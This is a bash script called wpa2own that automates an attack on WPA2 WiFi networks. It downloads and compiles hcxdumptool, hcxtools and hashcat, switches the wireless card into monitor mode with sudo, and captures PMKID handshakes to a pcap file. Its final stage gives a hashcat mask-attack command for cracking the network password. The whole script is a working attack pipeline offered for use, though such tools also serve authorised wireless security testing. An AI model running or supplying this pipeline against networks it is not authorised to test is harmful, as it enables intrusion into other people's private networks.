#!/bin/bash

# wpa2own (see README.md for details, usage, gotchas and license)

set -e

#### variables
# package capture file maximum size in megabytes (salt to taste)
pcap_max_size="10"
# no need to modify the following variables
timestamp=$(date +%s)
this_arch=$(arch)
this_uname=$(uname)

function rainbowsh(){
	#  Copyright 2013 Manuel Gutierrez <dhunterkde@gmail.com>
	#  https://github.com/xr09/rainbow.sh
	#  Bash helper functions to put colors on your scripts
	#
	#  Usage example:
	#  vargreen=$(echogreen "Grass is green")
	#  echo "Coming next: $vargreen"
	#
	__RAINBOWPALETTE="1"
	function __colortext()
	{
  	  echo -e " \e[$__RAINBOWPALETTE;$2m$1\e[0m"
	}
	function echogreen()
	{
	  echo $(__colortext "$1" "32")
	}
	function echored()
	{
  	  echo $(__colortext "$1" "31")
	}
	function echoblue()
	{
  	  echo $(__colortext "$1" "34")
	}
	function echopurple()
	{
  	  echo $(__colortext "$1" "35")
	}
	function echoyellow()
	{
	  echo $(__colortext "$1" "33")
	}
	function echocyan()
	{
	  echo $(__colortext "$1" "36")
	}
}

function rainbowsh_prompt(){
	# A status prompt scheme I created using the above rainbowsh project
	prompt_open=$(echocyan "[")
	prompt_action=$(echopurple ">>>")
	prompt_info=$(echoyellow "---")
	prompt_close=$(echocyan "]")
	prompt_startstatus=$(echogreen "run")
	prompt_errorstatus=$(echored "!!!")
	prompt_endstatus=$(echogreen "end")
	prompt_okstatus=$(echogreen "ok")
        
	prompt_start="$prompt_open $prompt_startstatus $prompt_close"
	prompt_verb="$prompt_open $prompt_action $prompt_close"
	prompt_adj="$prompt_open $prompt_info $prompt_close"
	prompt_error="$prompt_open $prompt_errorstatus $prompt_close"
	prompt_end="$prompt_open $prompt_endstatus $prompt_close"
}

function wpa2own_logo(){
cat << "EOF"
                       ____
 __      ___ __   __ _|___ \ _____      ___ __
 \ \ /\ / | '_ \ / _` | __) / _ \ \ /\ / | '_ \ 
  \ V  V /| |_) | (_| |/ __| (_) \ V  V /| | | |
   \_/\_/ | .__/ \__,_|_____\___/ \_/\_/ |_| |_|
EOF
echo "   v`cat VERSION` |_|  `shuf -n 1 txt/slogans`"
}

wpa2own_preflight(){
	if [ $this_uname != "Linux" ]; then
		echo "failed";echo "$prompt_error" "  Error: this script only supports Linux"
		echo "$prompt_end"
		exit 1
	else
		echo "$this_uname $prompt_okstatus"
	fi
	echo -n "$prompt_adj" "  Arch: "
	if [ $this_arch != "x86_64" ]; then
		echo "failed";echo "$prompt_error" "  Error: this script only supports a 64bit (x86_64) architecture"
		echo "$prompt_end"
		exit 1
	else
		echo "$this_arch $prompt_okstatus"
	fi

    # check for required cli tools
    for cli in git curl make bash sudo shuf; do
	if type "$cli" > /dev/null 2>&1; then
		echo -n "$prompt_adj" "  Apps: $cli "
		echo "$prompt_okstatus"
	fi	

        if ! type "$cli" > /dev/null 2>&1; then
	    echo "failed";echo "$prompt_error" "  Error: $cli not installed or in the PATH. Aborting." 
            exit 1
        fi
    done
}

function stage1-config(){
	echo -n "$prompt_adj" "  Directory: bin "
	if [ ! -d "bin" ]; then mkdir bin; fi
	echo "$prompt_okstatus"
	echo -n "$prompt_adj" "  Directory: out "
	if [ ! -d "out" ]; then mkdir out; fi
	echo "$prompt_okstatus "
	echo -n "$prompt_adj" "  Directory: src "
	if [ ! -d "src" ]; then mkdir src; fi
	echo "$prompt_okstatus"

	echo -n "$prompt_adj" "  Software: hcxdumptool "
	if [ ! -f "bin/hcxdumptool" ]; then
		echo
		cd src
		curl -s -L https://github.com/ZerBea/hcxdumptool/archive/4.2.1.tar.gz | tar zx 
		cd hcxdumptool-*
		make
		mv hcxdumptool ../../bin/
		cd ../..
        else
		echo "$prompt_okstatus"
	fi

	#if [ ! -f "bin/hashcat-legacy" ]; then
	#	echo "$prompt_adj" "      installing hashcat-legacy"
	#	cd src
	#	if [ ! -d "hashcat-legacy" ]; then
	#		git clone https://github.com/hashcat/hashcat-legacy.git
	#	fi
	#	cd hashcat-legacy
	#	#sudo ./tools/deps.sh
	#	make linux64
	#	mv hashcat-cli64.bin ../../bin/hashcat-legacy
	#	cd ../..
	#fi

	echo -n "$prompt_adj" "  Software: hashcat "
	if [ ! -f "bin/hashcat" ]; then
		echo
		cd src
		if [ ! -d "hashcat" ]; then
			git clone https://github.com/hashcat/hashcat.git
		fi
		cd hashcat
		git submodule update --init
		make
		mv hashcat ../../bin/
		cd ../..
        else
		echo "$prompt_okstatus"
	fi

	echo -n "$prompt_adj" "  Software: hcxpcaptool "
	if [ ! -f "bin/hcxpcaptool" ]; then
		echo
		cd src
		curl -s -L https://github.com/ZerBea/hcxtools/archive/4.2.1.tar.gz | tar zx 
		cd hcxtools-*
		make
 		mv hcxpcaptool hcxhashcattool wlanhc2hcx wlanwkp2hcx wlanhcxinfo wlanhcx2cap wlanhcx2essid wlanhcx2ssid wlanhcxmnc wlanhashhcx wlanhcxcat wlanpmk2hcx wlanjohn2hcx wlancow2hcxpmk whoismac wlanhcx2john wlanhcx2psk wlancap2wpasec ../../bin
		cd ../..
        else
		echo "$prompt_okstatus"
	fi
	echo -n "$prompt_adj" "  Software: making all binaries executeable"
	chmod a+x bin/*
	echo "$prompt_okstatus"
}

function stage2-capture(){
	# this will guess a network interface to use, if this fails, you might have to hardcode this like:
	#my_interface="wlan0"

	#TODO maybe use iwconfig to guess wireless nic?
	my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)

	# turn on monitor mode - again, your networking interface must support monitor mode
	# if it doesn't, this will fail, and everything else will too :(
	sudo ip link set $my_interface down
	sudo iw dev $my_interface set type monitor
	#sudo rfkill unblock all
	sudo ip link set $my_interface up

	# clear existing pcap if found
	#if [ ! -f "out/$timestamp.pcapng" ]; then rm -f out/$timestamp.pcapng; fi
	echo "$prompt_adj" "  - running package capture on interface $my_interface"

	# run hcxdumptool to capture traffic, build a pcap
	echo "** you may need to run this for 10 minute, look for the message [FOUND PMKID] then ctrl-c **"
	cd out
	# TODO create filterlist 
	#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
	sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
	#../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
}

function stage3-crack(){
	echo "$prompt_adj" "  - transfer file $timestamp.pcapng to GPU rig for cracking"
	#echo "** using hashcat to try and get the WPA PSK **"
	#echo "$prompt_adj" "  - running hashcat across package capture file"
	#../bin/hashcat -m 16800 $timestamp.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
	# or ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
	echo "$prompt_adj" "  - then run: ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'"
}

# Run the program
clear
rainbowsh
rainbowsh_prompt
wpa2own_logo

echo;echo "$prompt_start"
echo "$prompt_verb" "Stage 0"
echo -n "$prompt_adj" "  System: "

wpa2own_preflight

echo "$prompt_verb" "Stage 1"
stage1-config

echo "$prompt_verb" "Stage 2"
stage2-capture

echo "$prompt_verb" "Stage 3"
stage3-crack

echo "$prompt_end"

exit 0
